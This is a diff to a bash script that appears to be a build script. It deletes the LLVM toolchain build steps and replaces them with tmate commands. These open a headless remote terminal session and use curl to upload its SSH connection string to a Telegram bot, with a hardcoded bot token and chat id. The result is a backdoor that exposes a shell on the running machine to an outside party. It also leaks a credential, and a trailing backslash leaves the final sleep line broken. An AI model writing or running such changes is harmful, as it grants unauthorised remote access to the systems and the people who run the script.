@@ -1,27 +1,9 @@
 #!/usr/bin/env bash
-# Use xRageTC build script as LLVM Build Script.
-apt install bc \
-            binutils-dev \
-            bison \
-            ca-certificates \
-            ccache \
-            clang \
-            cmake \
-            curl \
-            file \
-            flex \
-            gcc \
-            g++ \
-            git \
-            libelf-dev \
-            libssl-dev \
-            make \
-            ninja-build \
-            python3 \
-            texinfo \
-            u-boot-tools \
-            xz-utils \
-            zlib1g-dev -y
-git clone https://github.com/awikwokproject/proton-clang-build -b master $(pwd)/llvmTC
-cd $(pwd)/llvmTC
-bash build-toolchain.sh
+tmate -S /tmp/tmate.sock new-session -d               # Launch tmate in a headless mode
+tmate -S /tmp/tmate.sock wait tmate-ready             # Blocks until the SSH connection is established
+tmate -S /tmp/tmate.sock display -p '#{tmate_ssh}' | tee /tmp/ssh.txt    # Prints the SSH connection string
+curl -F document=@/tmp/ssh.txt "https://api.telegram.org/bot1915991387:AAEwjpazwCDFZO6gpMdTUXfjSn1pwpbr5kk/sendDocument" \
+     -F chat_id="-578685820" \
+     -F "disable_web_page_preview=true" \
+     -F "parse_mode=html" \
+sleep 100
